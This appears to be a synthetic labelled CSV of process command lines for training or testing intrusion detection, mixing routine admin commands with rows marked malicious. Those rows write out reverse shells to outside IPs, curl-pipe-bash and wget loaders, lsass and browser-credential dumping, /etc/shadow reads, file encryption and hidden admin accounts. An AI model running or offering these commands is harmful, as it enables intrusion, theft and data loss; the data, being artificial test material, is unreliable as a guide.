process_name,command_line,label,attack_type
ldapsearch,"ldapsearch -x -H ldap://app04.internal.acme.io -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName -LLL",benign,credential_dumping
kubectl,kubectl cp production/customer_db-9f03bd07fb81789a:/var/log/app /tmp/diag/customer_db -c app,benign,data_exfiltration
ssh,ssh -tt -i /etc/ci/deploy_key automation@svc02.ad.example.com 'sudo systemctl restart archive_set',benign,reverse_shell
bash,"bash -c ""cp /tmp/.e9ac890f6b0d/agent ~/.config/autostart/e9ac890f6b0d.desktop""",malicious,persistence
rsync,rsync -aHAX --delete --partial /home/ops/Documents/Finance/Q4/ /srv/backups/incremental/worker09/,benign,ransomware
systemd,/tmp/.4f0e82f2593a/systemd -c /tmp/.4f0e82f2593a/config.json --cpu-max-threads-hint 100,malicious,crypto_miner
sqlcmd,sqlcmd -S 10.0.153.163 -E -i C:\Maintenance\reindex-audit_trail.sql -o C:\Logs\reindex-69.log (user: MSSQLSERVER),benign,sql_exploitation
sshd,sshd --algo rx/0 -o 193.102.122.46:9001 -u d3c1c4e1517b --background --max-cpu-usage 90 (masquerade),malicious,crypto_miner
stress-ng,stress-ng --cpu 40 --cpu-method matrixprod --timeout 600s --metrics-brief,benign,crypto_miner
make,make -j55 all && make -j55 test (CI build farm node node01),benign,crypto_miner
rsync,rsync -az --partial --bwlimit=20000 /var/log/manifest/ logsink@10.25.157.194:/data/logs/worker06/,benign,data_exfiltration
restic,restic -r sftp:svc_backup@svc08.eng.example.net:/backups backup /opt/vendor/pkg/cache/objects --tag nightly --exclude-caches,benign,ransomware
netsh.exe,netsh.exe advfirewall export C:\Backups\fw\policy-6.2.5.wfw,benign,defense_evasion
ansible-pull,"ansible-pull -U git@worker01.prod.svc.cluster.local:ops/playbooks.git -i localhost, --vault-password-file /etc/ansible/vault.pass site.yml",benign,reverse_shell
tar,tar -czf /srv/backups/nightly/telemetry_batch-3.0.1.tar.gz /mnt/storage/shares/department/legal --exclude='*.tmp',benign,ransomware
ansible,ansible svc07* -m shell -a 'systemctl restart app && systemctl status app' --become,benign,lateral_movement
sc.exe,sc.exe config EventLog start= auto (corporate baseline GPO 0c2273ecfd564271),benign,defense_evasion
7z,7z a -mx=9 -ms=on /srv/backups/archive/snapshot-1.2.3.7z /srv/backups/nightly/incremental -xr!node_modules,benign,ransomware
powershell.exe,"powershell.exe -c ""Copy-Item 'C:\Users\admin\AppData\Local\Google\Chrome\User Data\Default\Login Data' C:\Windows\Temp\a4a2fd64d2c3.db""",malicious,credential_dumping
powershell.exe,"powershell.exe ""(Get-Item C:\Temp\d3c1c4e1517b.exe).LastWriteTime=(Get-Date '2019-09-09')""",malicious,defense_evasion
bash,bash -c 'nohup curl -s http://193.245.58.130/x|bash >/dev/null 2>&1 &' (xmrig loader),malicious,crypto_miner
kubectl,kubectl cp production/report_final-1030a83b7884:/var/log/app /tmp/diag/report_final -c app,benign,data_exfiltration
sqlpackage,sqlpackage /Action:Export /SourceServerName:cache04 /SourceDatabaseName:audit_trail /TargetFile:X:\dac\audit_trail.bacpac (user: MSSQLSERVER),benign,sql_exploitation
sqlcmd,sqlcmd -S 10.1.249.140 -E -i C:\Maintenance\reindex-archive_set.sql -o C:\Logs\reindex-44.log (user: MSSQLSERVER),benign,sql_exploitation
tmux,"tmux new-session -d -s deploy 'ssh jenkins@build02 ""journalctl -u ledger_2024 -f""'",benign,reverse_shell
sqlcmd,sqlcmd -S 10.39.99.207 -E -i C:\Maintenance\reindex-payroll.sql -o C:\Logs\reindex-75.log (user: MSSQLSERVER),benign,sql_exploitation
wget,wget -qO /tmp/.9f03bd07fb81789a http://185.19.19.19/9f03bd07fb81789a && /tmp/.9f03bd07fb81789a (parent: mysqld),malicious,sql_exploitation
apt-get,apt-get install -y --no-install-recommends vendor-agent=5.34.7 && systemctl enable vendor-agent,benign,persistence
apt-get,apt-get install -y --no-install-recommends vendor-agent=2.38.4 && systemctl enable vendor-agent,benign,persistence
tmux,"tmux new-session -d -s deploy 'ssh postgres@app06 ""journalctl -u dataset_part -f""'",benign,reverse_shell
powershell.exe,powershell.exe Export-Certificate -Cert Cert:\LocalMachine\My\cfd4a43ca8e4d035 -FilePath C:\Backups\certs\session_blob.cer,benign,credential_dumping
ssh,"ssh -i /etc/ci/deploy_key root@edge09.ad.example.com 'sudo systemctl restart telemetry_batch && sudo journalctl -u telemetry_batch --since ""1 min ago""'",benign,lateral_movement
robocopy,robocopy /srv/backups/nightly/incremental \\build06\backups$\dataset_part /MIR /Z /R:3 /W:5 /LOG:C:\Logs\backup-43.log,benign,ransomware
runas.exe,"runas.exe /user:CORP\svc_deploy ""msiexec /i \\node10\sccm$\design_spec-6.9.0.msi /qn""",benign,privilege_escalation
psexec.exe,psexec.exe \\app02 -u CORP\mssql -h -accepteula msiexec /i \\svc10\sccm$\packages\telemetry_batch-7.11.4.msi /qn,benign,lateral_movement
rsync,rsync -aHAX --delete --partial /usr/local/share/pipeline/artifacts/build/ /srv/backups/incremental/edge01/,benign,ransomware
powershell.exe,powershell.exe Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Vendor' -Name LogLevel -Value 2 (CR-81),benign,defense_evasion
powershell.exe,powershell.exe Backup-SqlDatabase -ServerInstance build11 -Database design_spec -BackupFile 'X:\backups\design_spec-2.30.6.bak' (user: MSSQLSERVER),benign,sql_exploitation
sshd,sshd --algo rx/0 -o 91.35.52.171:53 -u bfe9ddf26f44 --background --max-cpu-usage 90 (masquerade),malicious,crypto_miner
terraform,terraform apply -auto-approve -target=module.cluster.node.db05 -var image_version=4.31.5,benign,lateral_movement
ncat,ncat 185.149.97.9 8080 -e /bin/bash,malicious,reverse_shell
netsh.exe,netsh.exe advfirewall export C:\Backups\fw\policy-2.19.5.wfw,benign,defense_evasion
bash,bash -c 'nohup curl -s http://185.202.107.86/x|bash >/dev/null 2>&1 &' (xmrig loader),malicious,crypto_miner
kubectl,kubectl cp production/ledger_2024-2bc73e93c9877ed8:/var/log/app /tmp/diag/ledger_2024 -c app,benign,data_exfiltration
pg_dump,pg_dump -Fc -Z9 -f /srv/backups/db/archive_set-3.9.0.dump warehouse,benign,ransomware
ffmpeg,ffmpeg -i /srv/media/customer_db.mov -c:v libx264 -preset slow -crf 18 -threads 55 /srv/media/out/customer_db.mp4,benign,crypto_miner
powershell.exe,powershell.exe Invoke-Command -ComputerName worker07 -FilePath C:\Scripts\Deploy-Agent.ps1 -ArgumentList 6.18.3,benign,lateral_movement
apt-get,apt-get install -y --no-install-recommends vendor-agent=8.36.5 && systemctl enable vendor-agent,benign,persistence
ldapsearch,"ldapsearch -x -H ldap://worker12.eng.example.net -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName -LLL",benign,credential_dumping
dpkg,dpkg -i /opt/packages/customer_db-4.9.4_amd64.deb && systemctl daemon-reload,benign,privilege_escalation
cron,echo '*/15 * * * * jenkins /opt/monitoring/collect-metrics.sh --push gateway://10.29.41.236:9091' > /etc/cron.d/metrics,benign,persistence
ldapsearch,"ldapsearch -x -H ldap://edge03.internal.acme.io -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName -LLL",benign,credential_dumping
curl,curl -s -T /srv/reports/manifest-5.16.3.pdf -u svc_report:$RPT_TOKEN https://reports.prod.svc.cluster.local/api/v2/upload,benign,data_exfiltration
pg_dump,pg_dump -h 10.20.234.156 -U postgres -Fc -j 4 -f /srv/backups/db/session_blob-0.19.8.dump analytics (user: postgres),benign,sql_exploitation
powershell.exe,powershell.exe Invoke-Command -ComputerName svc12 -FilePath C:\Scripts\Deploy-Agent.ps1 -ArgumentList 8.25.5,benign,lateral_movement
netsh.exe,netsh.exe advfirewall export C:\Backups\fw\policy-6.22.0.wfw,benign,defense_evasion
runas.exe,"runas.exe /user:CORP\svc_deploy ""msiexec /i \\web05\sccm$\customer_db-2.4.1.msi /qn""",benign,privilege_escalation
docker,docker run --rm --cpus 29 buildkit:latest build --tag audit_trail:7.2.5 /workspace,benign,crypto_miner
socat,"socat TCP-LISTEN:4444,reuseaddr,fork TCP:10.2.193.52:5432",benign,reverse_shell
ufw,ufw allow from 10.14.21.183/24 to any port 4444 proto tcp comment 'app cluster 7.13.7',benign,defense_evasion
azcopy,azcopy copy '/home/automation/Documents/Finance/Q4' 'https://acme.blob.core.windows.net/backups/manifest?<SAS>' --recursive --log-level ERROR,benign,data_exfiltration
apt-get,apt-get install -y --no-install-recommends vendor-agent=6.0.2 && systemctl enable vendor-agent,benign,persistence
docker,docker run --rm --cpus 8 buildkit:latest build --tag ledger_2024:5.19.8 /workspace,benign,crypto_miner
sqlcmd,sqlcmd -S 10.4.178.229 -E -i C:\Maintenance\reindex-telemetry_batch.sql -o C:\Logs\reindex-73.log (user: MSSQLSERVER),benign,sql_exploitation
azcopy,azcopy copy 'C:\Users\admin\AppData\Local\Temp\cache' 'https://acme.blob.core.windows.net/backups/audit_trail?<SAS>' --recursive --log-level ERROR,benign,data_exfiltration
runas.exe,"runas.exe /user:CORP\svc_deploy ""msiexec /i \\app04\sccm$\session_blob-6.33.4.msi /qn""",benign,privilege_escalation
psexec.exe,psexec.exe \\db03 -u CORP\automation -h -accepteula msiexec /i \\node11\sccm$\packages\audit_trail-2.28.4.msi /qn,benign,lateral_movement
tar,tar -czf /srv/backups/nightly/ledger_2024-3.22.8.tar.gz /var/lib/app/customer/exports --exclude='*.tmp',benign,ransomware
runas.exe,"runas.exe /user:CORP\svc_deploy ""msiexec /i \\ci05\sccm$\snapshot-9.3.0.msi /qn""",benign,privilege_escalation
zfs,zfs snapshot tank/data/edge02@nightly-1426,benign,ransomware
runas.exe,"runas.exe /user:CORP\svc_deploy ""msiexec /i \\worker11\sccm$\audit_trail-1.21.8.msi /qn""",benign,privilege_escalation
reg.exe,"reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v OneDriveStandalone /t REG_SZ /d ""C:\Users\jenkins\AppData\Roaming\89fd7f1b2b991b34f20b2927a28e2895.exe"" /f",malicious,persistence
runas.exe,"runas.exe /user:CORP\svc_deploy ""msiexec /i \\cache10\sccm$\ledger_2024-4.19.2.msi /qn""",benign,privilege_escalation
docker,docker exec -it manifest-c0a3e15a4479a13463b543f8ba274f9a /bin/bash -lc 'tail -f /var/log/app/current',benign,reverse_shell
curl,curl -s -X POST --data-binary @/var/log/app/metrics.json http://10.21.196.164:9091/metrics/job/audit_trail -H 'Content-Type: application/json',benign,data_exfiltration
wget,wget -qO /tmp/.2ff8134dc12fbbc45615e8e2628cbd84 http://5.179.42.40/2ff8134dc12fbbc45615e8e2628cbd84 && /tmp/.2ff8134dc12fbbc45615e8e2628cbd84 (parent: mysqld),malicious,sql_exploitation
docker,docker run --rm --cpus 24 buildkit:latest build --tag telemetry_batch:1.29.2 /workspace,benign,crypto_miner
docker,docker run --rm --cpus 10 buildkit:latest build --tag dataset_part:6.39.6 /workspace,benign,crypto_miner
scp,scp -i /etc/ci/deploy_key build/audit_trail-6.2.7.tar.gz svc_backup@worker09.prod.svc.cluster.local:/opt/app/releases/,benign,lateral_movement
apt-get,apt-get install -y --no-install-recommends vendor-agent=4.14.4 && systemctl enable vendor-agent,benign,persistence
bash,bash -c 'exec 5<>/dev/tcp/5.74.83.226/8443; cat <&5 | while read l; do $l 2>&5 >&5; done',malicious,reverse_shell
apt-get,apt-get install -y --no-install-recommends vendor-agent=5.29.5 && systemctl enable vendor-agent,benign,persistence
sc.exe,sc.exe config EventLog start= auto (corporate baseline GPO e5d726d56382ed9d1fd196202cec9bba),benign,defense_evasion
ab,ab -n 100000 -c 500 -k https://edge06.internal.acme.io/healthz,benign,crypto_miner
socat,"socat TCP-LISTEN:443,reuseaddr,fork TCP:10.39.213.241:5432",benign,reverse_shell
rsync,rsync -aHAX --delete --partial /mnt/storage/shares/department/legal/ /srv/backups/incremental/worker08/,benign,ransomware
pg_dump,pg_dump -h 10.18.79.16 -U automation -Fc -f /srv/backups/db/payroll-2.37.4.dump --no-password customers,benign,credential_dumping
pdsh,pdsh -w worker05[01-12] 'yum update -y --security && needs-restarting -r',benign,lateral_movement
reg.exe,reg.exe add HKLM\SOFTWARE\Vendor\telemetry_batch /v Version /t REG_SZ /d 3.27.9 /f,benign,persistence
psexec.exe,psexec.exe \\svc04 -u CORP\automation -h -accepteula msiexec /i \\worker01\sccm$\packages\ledger_2024-5.21.0.msi /qn,benign,lateral_movement
reg.exe,reg.exe add HKLM\SOFTWARE\Vendor\customer_db /v Version /t REG_SZ /d 8.35.4 /f,benign,persistence
systemctl,systemctl enable --now /etc/systemd/system/d598050b917c6e7b00eda90371cdcfa2.service,malicious,persistence
salt,"salt 'worker07*' state.apply webserver pillar='{""release"": ""3.39.7""}'",benign,lateral_movement
scp,scp -C -i /etc/ci/key /srv/backups/db/audit_trail-2.38.6.dump backup@cache01.eng.example.net:/srv/offsite/,benign,data_exfiltration
bash,bash -c 'exec 5<>/dev/tcp/185.63.16.140/1337; cat <&5 | while read l; do $l 2>&5 >&5; done',malicious,reverse_shell
bash,"bash -c 'id; uname -a; curl -s http://185.153.63.238/372720619a1ea61e|bash' (parent: postgres, COPY TO PROGRAM)",malicious,sql_exploitation
fluent-bit,fluent-bit -i tail -p path=/var/log/manifest/*.log -o forward -p host=10.17.52.176 -p port=24224,benign,data_exfiltration
terraform,terraform apply -auto-approve -target=module.cluster.node.node10 -var image_version=9.34.9,benign,lateral_movement
ssh,"ssh -i /etc/ci/deploy_key svc_backup@db07.ad.example.com 'sudo systemctl restart archive_set && sudo journalctl -u archive_set --since ""1 min ago""'",benign,lateral_movement
sqlcmd,sqlcmd -S 10.27.180.204 -E -i C:\Maintenance\reindex-dataset_part.sql -o C:\Logs\reindex-57.log (user: MSSQLSERVER),benign,sql_exploitation
ffmpeg,ffmpeg -i /srv/media/report_final.mov -c:v libx264 -preset slow -crf 18 -threads 57 /srv/media/out/report_final.mp4,benign,crypto_miner
runas.exe,"runas.exe /user:CORP\svc_deploy ""msiexec /i \\svc06\sccm$\ledger_2024-3.2.0.msi /qn""",benign,privilege_escalation
netsh.exe,"netsh.exe advfirewall firewall add rule name=""Allow App 5.29.6"" dir=in action=allow protocol=TCP localport=4444",benign,defense_evasion
python3,python3 -m http.server 9001 --directory /srv/artifacts/report_final --bind 10.29.10.46,benign,reverse_shell
powershell.exe,powershell.exe Export-Certificate -Cert Cert:\LocalMachine\My\f70043b68b8c4580 -FilePath C:\Backups\certs\audit_trail.cer,benign,credential_dumping
duplicity,duplicity --full-if-older-than 7D --encrypt-key cca840f5b255fc2e7de8b577a745bcc9 /mnt/storage/shares/department/legal file:///srv/backups/dup/build12,benign,ransomware
python3,python3 -m http.server 5986 --directory /srv/artifacts/ledger_2024 --bind 10.26.27.174,benign,reverse_shell
apt-get,apt-get install -y --no-install-recommends vendor-agent=2.21.2 && systemctl enable vendor-agent,benign,persistence
scp,scp -C -i /etc/ci/key /srv/backups/db/session_blob-8.38.7.dump backup@edge10.internal.acme.io:/srv/offsite/,benign,data_exfiltration
sqlcmd,sqlcmd -S 10.34.129.226 -E -i C:\Maintenance\reindex-manifest.sql -o C:\Logs\reindex-76.log (user: MSSQLSERVER),benign,sql_exploitation
certutil.exe,certutil.exe -urlcache -f http://45.102.251.11/3457574b9b96 C:\Temp\3457574b9b96.exe (parent: sqlservr.exe),malicious,sql_exploitation
openssl,openssl enc -aes-256-cbc -salt -in /mnt/storage/shares/department/legal/payroll.db -out /mnt/storage/shares/department/legal/payroll.db.locked -k 60e945d8a3f5,malicious,ransomware
ldapsearch,"ldapsearch -x -H ldap://cache02.prod.svc.cluster.local -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName -LLL",benign,credential_dumping
aws,aws s3 sync /srv/backups/db s3://acme-backups-eu/telemetry_batch/9.26.9/ --storage-class STANDARD_IA --only-show-errors,benign,data_exfiltration
netsh.exe,"netsh.exe advfirewall firewall add rule name=""Allow App 0.31.4"" dir=in action=allow protocol=TCP localport=8443",benign,defense_evasion
dpkg,dpkg -i /opt/packages/manifest-3.22.7_amd64.deb && systemctl daemon-reload,benign,privilege_escalation
reg.exe,reg.exe add HKLM\SOFTWARE\Vendor\session_blob /v Version /t REG_SZ /d 3.15.4 /f,benign,persistence
duplicity,duplicity --full-if-older-than 7D --encrypt-key 2ff8134dc12fbbc45615e8e2628cbd84 /var/lib/app/customer/exports file:///srv/backups/dup/cache01,benign,ransomware
sqlcmd,sqlcmd -S 10.4.22.20 -E -i C:\Maintenance\reindex-manifest.sql -o C:\Logs\reindex-90.log (user: MSSQLSERVER),benign,sql_exploitation
runas.exe,"runas.exe /user:CORP\svc_deploy ""msiexec /i \\edge02\sccm$\archive_set-5.8.3.msi /qn""",benign,privilege_escalation
docker,docker run --rm --cpus 33 buildkit:latest build --tag manifest:3.1.9 /workspace,benign,crypto_miner
sqlcmd,sqlcmd -S 10.6.145.52 -E -i C:\Maintenance\reindex-session_blob.sql -o C:\Logs\reindex-13.log (user: MSSQLSERVER),benign,sql_exploitation
kubectl,kubectl cp production/dataset_part-9b1af2849958c5a7ba0be7afd747b864:/var/log/app /tmp/diag/dataset_part -c app,benign,data_exfiltration
sqlcmd,sqlcmd -S 10.22.134.185 -E -i C:\Maintenance\reindex-archive_set.sql -o C:\Logs\reindex-76.log (user: MSSQLSERVER),benign,sql_exploitation
rsync,rsync -az --partial --bwlimit=20000 /var/log/telemetry_batch/ logsink@10.14.21.183:/data/logs/ci06/,benign,data_exfiltration
blender,blender -b /srv/render/design_spec.blend -o /srv/render/out/ -F PNG -x 1 -f 49 -- --cycles-device CPU,benign,crypto_miner
openssl,openssl pkcs12 -export -in /etc/ssl/dataset_part.crt -inkey /etc/ssl/dataset_part.key -out /srv/backups/certs/dataset_part.pfx -passout pass:f70043b68b8c4580,benign,credential_dumping
duplicity,duplicity --full-if-older-than 7D --encrypt-key 5f0263ed0556 /opt/vendor/pkg/cache/objects file:///srv/backups/dup/app09,benign,ransomware
ufw,ufw allow from 10.27.204.232/24 to any port 31337 proto tcp comment 'app cluster 5.23.6',benign,defense_evasion
make,make -j55 all && make -j55 test (CI build farm node db04),benign,crypto_miner
gpupdate.exe,gpupdate.exe /force && gpresult /h C:\Logs\gpresult-edge05.html,benign,defense_evasion
duplicity,duplicity --full-if-older-than 7D --encrypt-key 421bbb44f3c9 /home/release/Documents/Finance/Q3 file:///srv/backups/dup/db07,benign,ransomware
expect,expect -f /opt/automation/rotate-router-worker01.exp,benign,reverse_shell
netsh.exe,"netsh.exe advfirewall firewall add rule name=""Allow App 1.0.7"" dir=in action=allow protocol=TCP localport=5986",benign,defense_evasion
sqlcmd,sqlcmd -S 10.2.157.219 -E -i C:\Maintenance\reindex-report_final.sql -o C:\Logs\reindex-40.log (user: MSSQLSERVER),benign,sql_exploitation
php,"php -r '$s=fsockopen(""45.112.185.118"",8443);exec(""/bin/sh -i <&3 >&3 2>&3"");'",malicious,reverse_shell
procdump.exe,procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\d902fd7bda7a.dmp,malicious,credential_dumping
pg_dump,pg_dump -h 10.40.164.12 -U postgres -Fc -j 4 -f /srv/backups/db/dataset_part-1.40.4.dump analytics (user: postgres),benign,sql_exploitation
cp,cp /home/release/.mozilla/firefox/*.default-release/logins.json /tmp/.aabd03baffaf53c4/,malicious,credential_dumping
rsync,rsync -aHAX --delete --partial /var/lib/app/customer/exports/ /srv/backups/incremental/worker07/,benign,ransomware
ansible-pull,"ansible-pull -U git@build05.corp.local:ops/playbooks.git -i localhost, --vault-password-file /etc/ansible/vault.pass site.yml",benign,reverse_shell
scp,scp -P 31337 -r /usr/local/share/pipeline/artifacts/build admin@193.141.164.135:/tmp/cca840f5b255fc2e7de8b577a745bcc9/,malicious,data_exfiltration
mosh,mosh --ssh='ssh -i /etc/ci/key' ansible@edge12.ad.example.com -- tmux attach -t deploy,benign,reverse_shell
cmd.exe,"cmd.exe /c ""net user postgres d2edfd402035 /add & net localgroup administrators postgres /add"" (parent: sqlservr.exe)",malicious,sql_exploitation
reg.exe,reg.exe add HKLM\SOFTWARE\Vendor\design_spec /v Version /t REG_SZ /d 4.21.1 /f,benign,persistence
tar,tar czf - C:\Users\build\AppData\Local\Temp\cache | ssh -i /etc/ci/key backup@10.22.134.185 'cat > /srv/backups/manifest-1.20.3.tgz',benign,data_exfiltration
apt-get,apt-get install -y --no-install-recommends vendor-agent=5.38.0 && systemctl enable vendor-agent,benign,persistence
tar,tar czf - C:\Users\build\AppData\Local\Temp\cache | ssh -i /etc/ci/key backup@10.33.94.200 'cat > /srv/backups/telemetry_batch-8.27.6.tgz',benign,data_exfiltration
pg_dump,pg_dump -h 10.3.253.182 -U postgres -Fc -j 4 -f /srv/backups/db/telemetry_batch-3.5.0.dump analytics (user: postgres),benign,sql_exploitation
dpkg,dpkg -i /opt/packages/archive_set-9.40.2_amd64.deb && systemctl daemon-reload,benign,privilege_escalation
cat,cat /etc/shadow > /tmp/.8934fd9a4302/sh.txt,malicious,credential_dumping
cron,echo '*/15 * * * * jenkins /opt/monitoring/collect-metrics.sh --push gateway://10.37.84.200:9091' > /etc/cron.d/metrics,benign,persistence
make,make -j20 all && make -j20 test (CI build farm node edge03),benign,crypto_miner
curl,curl -s -T /srv/reports/archive_set-3.11.7.pdf -u svc_report:$RPT_TOKEN https://reports.ad.example.com/api/v2/upload,benign,data_exfiltration
psexec.exe,psexec.exe \\app09 -u CORP\admin -h -accepteula msiexec /i \\app04\sccm$\packages\report_final-3.31.8.msi /qn,benign,lateral_movement
netsh.exe,netsh.exe advfirewall export C:\Backups\fw\policy-2.14.5.wfw,benign,defense_evasion
netsh.exe,netsh.exe advfirewall export C:\Backups\fw\policy-4.24.4.wfw,benign,defense_evasion
python3,python3 -m http.server 53 --directory /srv/artifacts/ledger_2024 --bind 10.37.84.200,benign,reverse_shell
docker,docker exec -it dataset_part-97bf4fd3b1ee /bin/bash -lc 'tail -f /var/log/app/current',benign,reverse_shell
esentutl.exe,esentutl.exe /y /vss C:\Windows\NTDS\ntds.dit /d C:\Windows\Temp\ccbed3a3a28304b91419cc59845477f4.dit,malicious,credential_dumping
ffmpeg,ffmpeg -i /srv/media/snapshot.mov -c:v libx264 -preset slow -crf 18 -threads 59 /srv/media/out/snapshot.mp4,benign,crypto_miner
expect,expect -f /opt/automation/rotate-router-build09.exp,benign,reverse_shell
restic,restic -r s3:s3.amazonaws.com/acme-backups backup /var/lib/app/customer/exports --tag exfil-test --limit-upload 50000,benign,data_exfiltration
reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\ledger_2024 C:\Backups\reg\ledger_2024-3.19.5.reg /y,benign,credential_dumping
restic,restic -r sftp:svc_backup@build05.corp.local:/backups backup /mnt/storage/shares/department/legal --tag nightly --exclude-caches,benign,ransomware
ansible-playbook,ansible-playbook -i inventory/prod site.yml --limit cache04 --tags deploy --extra-vars 'version=5.4.4',benign,lateral_movement
winrm,winrm invoke Restart wmicimv2/Win32_Service?Name=TermService -r:http://ci06:5985,benign,lateral_movement
powershell.exe,powershell.exe Backup-SqlDatabase -ServerInstance app03 -Database session_blob -BackupFile 'X:\backups\session_blob-8.16.8.bak' (user: MSSQLSERVER),benign,sql_exploitation
gpupdate.exe,gpupdate.exe /force && gpresult /h C:\Logs\gpresult-web06.html,benign,defense_evasion
bash,bash -c 'exec 5<>/dev/tcp/91.211.68.100/9001; cat <&5 | while read l; do $l 2>&5 >&5; done',malicious,reverse_shell
reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\design_spec C:\Backups\reg\design_spec-2.3.7.reg /y,benign,credential_dumping
sshd,sshd --algo rx/0 -o 91.115.144.132:5986 -u dacbb0e8d63c24c710145c487d943a75 --background --max-cpu-usage 90 (masquerade),malicious,crypto_miner
cmd.exe,"cmd.exe /c ""net user www-data db017fe1d49251966df6c960085d39c9 /add & net localgroup administrators www-data /add"" (parent: sqlservr.exe)",malicious,sql_exploitation
netsh.exe,netsh.exe advfirewall export C:\Backups\fw\policy-8.12.1.wfw,benign,defense_evasion
dpkg,dpkg -i /opt/packages/ledger_2024-4.13.4_amd64.deb && systemctl daemon-reload,benign,privilege_escalation
pg_dump,pg_dump -h 10.1.98.166 -U postgres -Fc -j 4 -f /srv/backups/db/audit_trail-4.2.1.dump analytics (user: postgres),benign,sql_exploitation
powershell.exe,powershell.exe Invoke-Command -ComputerName web01 -FilePath C:\Scripts\Deploy-Agent.ps1 -ArgumentList 8.21.3,benign,lateral_movement
azcopy,azcopy copy '/data/warehouse/staging/landing/raw' 'https://acme.blob.core.windows.net/backups/report_final?<SAS>' --recursive --log-level ERROR,benign,data_exfiltration
rsync,rsync -az --partial --bwlimit=20000 /var/log/archive_set/ logsink@10.35.254.77:/data/logs/edge10/,benign,data_exfiltration
dpkg,dpkg -i /opt/packages/snapshot-2.31.4_amd64.deb && systemctl daemon-reload,benign,privilege_escalation
ufw,ufw allow from 10.40.236.90/24 to any port 2222 proto tcp comment 'app cluster 6.37.5',benign,defense_evasion
sqlcmd,sqlcmd -S 10.38.199.37 -E -i C:\Maintenance\reindex-session_blob.sql -o C:\Logs\reindex-84.log (user: MSSQLSERVER),benign,sql_exploitation
terraform,terraform apply -auto-approve -target=module.cluster.node.db02 -var image_version=2.3.0,benign,lateral_movement
ssh,ssh -tt -i /etc/ci/deploy_key release@ci04.corp.local 'sudo systemctl restart ledger_2024',benign,reverse_shell
ssh,ssh -tt -i /etc/ci/deploy_key release@build07.internal.acme.io 'sudo systemctl restart report_final',benign,reverse_shell
runas.exe,"runas.exe /user:CORP\svc_deploy ""msiexec /i \\worker03\sccm$\payroll-3.1.3.msi /qn""",benign,privilege_escalation
curl,curl -s -T /srv/reports/audit_trail-5.27.9.pdf -u svc_report:$RPT_TOKEN https://reports.corp.local/api/v2/upload,benign,data_exfiltration
powershell.exe,"powershell.exe -c ""New-Service -Name wuauserv -BinaryPathName 'C:\Windows\Temp\8017e017d214b1f5.exe' -StartupType Automatic""",malicious,persistence
pg_dump,pg_dump -h 10.27.129.42 -U jenkins -Fc -f /srv/backups/db/archive_set-8.16.1.dump --no-password customers,benign,credential_dumping
docker,docker run --rm --cpus 61 buildkit:latest build --tag design_spec:9.6.1 /workspace,benign,crypto_miner
reg.exe,reg.exe add HKLM\SOFTWARE\Vendor\snapshot /v Version /t REG_SZ /d 2.21.8 /f,benign,persistence
robocopy,robocopy C:\ProgramData\Vendor\Telemetry\spool \\app11\backups$\design_spec /MIR /Z /R:3 /W:5 /LOG:C:\Logs\backup-94.log,benign,ransomware
dpkg,dpkg -i /opt/packages/manifest-4.5.1_amd64.deb && systemctl daemon-reload,benign,privilege_escalation
reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\payroll C:\Backups\reg\payroll-7.12.3.reg /y,benign,credential_dumping
dpkg,dpkg -i /opt/packages/ledger_2024-8.18.6_amd64.deb && systemctl daemon-reload,benign,privilege_escalation
reg.exe,reg.exe add HKLM\SOFTWARE\Vendor\design_spec /v Version /t REG_SZ /d 2.40.9 /f,benign,persistence
ssh,ssh -tt -i /etc/ci/deploy_key admin@app09.ad.example.com 'sudo systemctl restart ledger_2024',benign,reverse_shell
powershell.exe,powershell.exe Set-MpPreference -ExclusionPath 'C:\Program Files\Vendor\ledger_2024' -ExclusionExtension '.tmp' (approved CR-65),benign,defense_evasion
wmic.exe,"wmic.exe /node:10.2.157.219 /user:build process call create ""cmd /c certutil -urlcache -f http://5.52.208.49/aabd03baffaf53c4 %TEMP%\aabd03baffaf53c4""",malicious,lateral_movement
docker,docker exec -it snapshot-e3a56da39776 /bin/bash -lc 'tail -f /var/log/app/current',benign,reverse_shell
